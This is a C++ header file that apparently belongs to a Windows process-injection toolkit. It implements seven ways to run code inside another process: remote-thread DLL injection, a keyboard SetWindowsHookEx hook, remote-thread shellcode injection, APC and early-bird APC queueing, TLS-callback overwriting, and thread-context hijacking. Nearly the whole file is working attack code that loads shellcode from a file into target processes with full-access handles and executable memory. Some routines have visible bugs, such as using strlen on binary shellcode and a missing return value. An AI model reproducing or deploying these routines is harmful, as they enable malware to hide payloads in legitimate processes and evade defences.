#pragma once

#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>
#include <vector>
#include <string>
#include <DbgHelp.h>

#include "Utiliti.h"

using namespace std;

#pragma comment(lib, "Dbghelp.lib")


DWORD InjectDllUsingCreateRemoteThread(DWORD PID, WCHAR* DllName);
DWORD InjectDllUsingSetWindowHook(WCHAR* DllName, WCHAR* ExportedFunctioName);
DWORD InjectShellCodeInProcess(DWORD PID, WCHAR* ShellCodeFileName);
DWORD InjectUsingAPC(DWORD PID, WCHAR* ShellCodeFileName);
DWORD InjectUsingEarlyBirdAPC(WCHAR* ExecutablePath, WCHAR* ShellCodeFileName);
DWORD InjectUsingTLSCallBack(DWORD PID, WCHAR* ShellCodeFileName , WCHAR* ExecutablePath );
DWORD InjectUsingThreadExecutionHijacking(DWORD PID, WCHAR* ShellCodeFileName);

DWORD InjectDllUsingCreateRemoteThread(DWORD PID, WCHAR* DllName) {

	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	DWORD Status = NULL;
	LPVOID BaseAddress = NULL;
	DWORD BytesWritten;
	FARPROC LoadDllAddress = NULL;
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (!hProcess) {
		printf("Failed to Open handle to process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}

	BaseAddress = VirtualAllocEx(hProcess, BaseAddress, wcslen(DllName)*2 +2, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!BaseAddress) {
		printf("Failed to Allocate Memory in process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}

	Status = WriteProcessMemory(hProcess, BaseAddress, DllName, wcslen(DllName)*2+2, NULL);
	if (!Status) {
		printf("Failed to Write to Memory in process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}

	LoadDllAddress = GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryW");
	if (!LoadDllAddress) {
		printf("Failed to Get CreateRemoteThread Address Error Code is0x%x\n", GetLastError());
		return -1;
	}

	hThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadDllAddress, BaseAddress, NULL, NULL);
	if (!hThread) {
		printf("Failed to Create Remote Thread in process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}

	return 0;
}

DWORD InjectDllUsingSetWindowHook( WCHAR* DllName, WCHAR* ExportedFunctioName) {

	HMODULE DllBase = LoadLibraryW(DllName);
	if (!DllBase) {
		printf("Failed To Load Dll %S  Error Code is 0x%x\n", DllName, GetLastError());
		return -1;
	}

	wstring FunNameW(ExportedFunctioName);
	string FunNameA(FunNameW.begin(), FunNameW.end());
	HOOKPROC functionAddress = HOOKPROC(GetProcAddress(DllBase, FunNameA.c_str()));
	if (!functionAddress) {
		printf("Failed To Resolve Function address %S  Error Code is 0x%x\n", ExportedFunctioName, GetLastError());
		return -1;
	}

	HHOOK hookHandle = SetWindowsHookExW(WH_KEYBOARD, functionAddress, DllBase, 0);
	if (!functionAddress) {
		printf("Failed To Set Windows Hool  Error Code is 0x%x\n", GetLastError());
		return -1;
	}

	Sleep(10 * 1000);

	UnhookWindowsHookEx(hookHandle);

	return 0;
}

DWORD InjectShellCodeInProcess(DWORD PID, WCHAR* ShellCodeFileName) {

	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	DWORD Status = NULL;
	LPVOID ShelCodeAddress = NULL;
	DWORD BytesWritten;

	BYTE* ShellCode = ReadDataFromFile(ShellCodeFileName);
	if (!ShellCode) {
		return -1;
	}

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (!hProcess) {
		printf("Failed to Open handle to process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}

	ShelCodeAddress = VirtualAllocEx(hProcess, ShelCodeAddress, strlen((const char*)ShellCode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!ShelCodeAddress) {
		printf("Failed to Allocate Memory in process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}

	Status = WriteProcessMemory(hProcess, ShelCodeAddress, ShellCode, strlen((const char*)ShellCode), NULL);
	if (!Status) {
		printf("Failed to Write to Memory in process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}

	hThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)ShelCodeAddress, NULL, NULL, NULL);
	if (!hThread) {
		printf("Failed to Create Remote Thread in process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}
	return 0;
}

//the ShellCode should handle that it will runs more that once (number of threads in process)
DWORD InjectUsingAPC(DWORD PID, WCHAR* ShellCodeFileName) {
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	DWORD Status = NULL;
	LPVOID ShelCodeAddress = NULL;
	DWORD BytesWritten;
	DWORD TID = -1;
	vector<DWORD> ThreadIds;

	system("pause");
	BYTE* ShellCode = ReadDataFromFile(ShellCodeFileName);
	if (!ShellCode) {
		return -1;
	}

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (!hProcess) {
		printf("Failed to Open handle to process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}

	ShelCodeAddress = VirtualAllocEx(hProcess, ShelCodeAddress, strlen((const char*)ShellCode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!ShelCodeAddress) {
		printf("Failed to Allocate Memory in process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}

	Status = WriteProcessMemory(hProcess, ShelCodeAddress, ShellCode, strlen((const char*)ShellCode), NULL);
	if (!Status) {
		printf("Failed to Write to Memory in process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}

	HANDLE snapshot = CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, 0);
	THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };

	if (Thread32First(snapshot, &threadEntry)) {
		do {
			if (threadEntry.th32OwnerProcessID == PID) {
				ThreadIds.push_back(threadEntry.th32ThreadID);
			}
		} while (Thread32Next(snapshot, &threadEntry));
	}

	// Qeue APC From all threads in the process
	for (DWORD threadId : ThreadIds) {
		HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, TRUE, threadId);
		if (!hThread) {
			printf("Failed to Open handle to Thread TID %d  Error Code is0x%x\n", PID, GetLastError());
			continue;
		}

		Status = QueueUserAPC((PAPCFUNC)ShelCodeAddress, hThread, NULL);
		if (!Status) {
			printf("Failed to Queue APC to Thread Is %d in process PID %d  Error Code is0x%x\n", threadId, PID, GetLastError());
		}

		Sleep(1000 * 2);
		CloseHandle(hThread);
	}
}

DWORD InjectUsingEarlyBirdAPC(WCHAR* ExecutablePath, WCHAR* ShellCodeFileName) {

	PROCESS_INFO ProcInfo;
	DWORD Status = StartExecutableAsSuspended(ExecutablePath, &ProcInfo,CREATE_SUSPENDED);
	if (!Status) {
		return -1;
	}

	Status = InjectUsingAPC(ProcInfo.PID, ShellCodeFileName);

	ResumeProcess(ProcInfo.MainThreadHandle);
	return Status;
}

//TODO If no TLS CallBack in process Create New Section For it
DWORD InjectUsingTLSCallBack(DWORD PID, WCHAR* ShellCodeFileName, WCHAR* ExecutablePath) {
	PROCESS_INFO ProcessInfo;
	DWORD Status = FALSE;
	MODULE_INFO ModuleInfo;
	DWORD dwContinueStatus = DBG_CONTINUE; // exception continuation 
	DEBUG_EVENT DebugEv;

	if (PID != 0) {
		ProcessInfo.MainThreadHandle = NULL;
		ProcessInfo.PID =PID;
	}
	else {
		Status = StartExecutableAsSuspended(ExecutablePath, &ProcessInfo, DEBUG_PROCESS);
		if (!Status) {
			return -1;
		}
	}

	WaitForDebugEvent(&DebugEv, INFINITE);
	ModuleInfo.MainModuleAddress = (BYTE*)DebugEv.u.CreateProcessInfo.lpBaseOfImage;

	BYTE* LocalCopyOfMainModule = new BYTE[500];
	HANDLE hProcess = DebugEv.u.CreateProcessInfo.hProcess;

	Status = ReadProcessMemory(hProcess, ModuleInfo.MainModuleAddress, LocalCopyOfMainModule, 500, 0);
	PIMAGE_DOS_HEADER dosHeader = {};
	PIMAGE_NT_HEADERS imageNTHeaders = {};
	dosHeader = (PIMAGE_DOS_HEADER)LocalCopyOfMainModule;
	imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD)LocalCopyOfMainModule + dosHeader->e_lfanew);
	DWORD Size = imageNTHeaders->OptionalHeader.SizeOfImage;

	ModuleInfo.MainModuleSize = Size;

	/*sleep for 2 second to let the process start
	Sleep(2000);

	GetMainModuleInfo(ProcessInfo.PID, &ModuleInfo);*/

	BYTE* ShellCode = ReadDataFromFile(ShellCodeFileName);
	Status = ChangeTheTLSCallBackFunctionInRemoteProcess(ProcessInfo.PID, &ModuleInfo, ShellCode);
	
	CloseHandle(DebugEv.u.CreateProcessInfo.hFile);
	Status = DebugActiveProcessStop(PID);
	if (!Status) {
		printf("Faile to Deattach From Process Error Code is 0x%x\n", GetLastError());
		Status = -1;
	}
	else Status = 0;

	return Status;
}

DWORD InjectUsingThreadExecutionHijacking(DWORD PID, WCHAR* ShellCodeFileName) {
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	DWORD Status = NULL;
	LPVOID ShelCodeAddress = NULL;
	DWORD BytesWritten;
	BYTE ShellCode[] = { 0xAA,0xbb,0xcc,0x00 };
	BYTE* ShellCode1 = NULL;//= ReadDataFromFile(ShellCodeFileName);
	if (!ShellCode) {
		return -1;
	}

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (!hProcess) {
		printf("Failed to Open handle to process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}

	ShelCodeAddress = VirtualAllocEx(hProcess, ShelCodeAddress, strlen((const char*)ShellCode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!ShelCodeAddress) {
		printf("Failed to Allocate Memory in process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}
	Status = WriteProcessMemory(hProcess, ShelCodeAddress, ShellCode, strlen((const char*)ShellCode), NULL);
	if (!Status) {
		printf("Failed to Write to Memory in process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
	CONTEXT ThreadContext;

	memset(&ThreadContext, 0, sizeof(CONTEXT));
	ThreadContext.ContextFlags = CONTEXT_ALL;

	if (Thread32First(snapshot, &threadEntry)) {
		do {
			if (threadEntry.th32OwnerProcessID == PID ) {

				HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, TRUE, threadEntry.th32ThreadID);
				if (!hThread) {
					printf("Failed to Open handle to Thread TID %d  Error Code is0x%x\n", PID, GetLastError());
					continue;
				}
				
				Status = SuspendThread(hThread);
				if (Status ==-1) {
					printf("Failed to Suspend Thread TID %d  Error Code is0x%x\n", PID, GetLastError());
					CloseHandle(hThread);
					continue;
				}
				
				if (GetThreadContext(hThread, &ThreadContext))
				{
					printf("ShellCode addr  %p", ShelCodeAddress);
#if _WIN64			
					ThreadContext.Rip = (DWORD64)ShelCodeAddress;
#else
					ThreadContext.Eip = (DWORD64)ShelCodeAddress;
#endif
					if (!SetThreadContext(hThread, &ThreadContext)) {
						printf("Failed to Set Thread Context to Thread TID %d  Error Code is0x%x\n", PID, GetLastError());
						CloseHandle(hThread);
						continue;
					}
					Status = ResumeThread(hThread);
					if (Status == -1) {
						printf("Failed to Resume Thread TID %d  Error Code is0x%x\n", PID, GetLastError());
						CloseHandle(hThread);
						continue;
					}
					CloseHandle(hThread);
					return 0;
				}

				printf("Failed to Get Thread Context to Thread TID %d  Error Code is0x%x\n", PID, GetLastError());
				CloseHandle(hThread);
			}
			
		} while (Thread32Next(snapshot, &threadEntry));
	}

	return -1;
}